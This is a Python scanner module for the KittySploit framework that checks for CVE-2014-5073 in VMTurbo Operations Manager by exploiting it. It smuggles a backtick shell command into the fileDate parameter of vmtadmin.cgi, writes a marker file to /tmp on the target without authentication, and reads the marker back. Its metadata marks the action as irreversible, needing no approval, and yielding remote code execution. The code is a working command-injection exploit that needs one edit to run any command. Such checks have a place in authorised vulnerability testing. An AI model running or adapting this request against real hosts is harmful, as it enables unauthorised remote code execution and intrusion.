#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""VMTurbo Operations Manager vmtadmin.cgi RCE (CVE-2014-5073)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'VMTurbo - vmtadmin.cgi RCE Detection (CVE-2014-5073)',
        'description': (
            'Detects CVE-2014-5073 by injecting a backtick command via '
            'vmtadmin.cgi fileDate that writes a marker into /tmp/vmtbackup.zip.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'vmturbo', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-5073',
        ],
        'cve': 'CVE-2014-5073',
    }

    def run(self):
        marker = self.random_text(10)
        cmd = f'echo%20{marker}%20>%20/tmp/vmtbackup.zip'
        inj = (
            f'/cgi-bin/vmtadmin.cgi?callType=DOWN&actionType=CFGBACKUP'
            f'&fileDate="`{cmd}`"'
        )
        self.http_request(method='GET', path=inj, allow_redirects=False)
        r = self.http_request(
            method='GET',
            path='/cgi-bin/vmtadmin.cgi?callType=DOWN&actionType=CFGBACKUP',
            allow_redirects=False,
        )
        if r and r.status_code == 200 and marker in (r.text or ''):
            self.set_info(
                severity='critical',
                reason='VMTurbo vmtadmin.cgi RCE (CVE-2014-5073)',
                path='/cgi-bin/vmtadmin.cgi',
            )
            return True
        return False
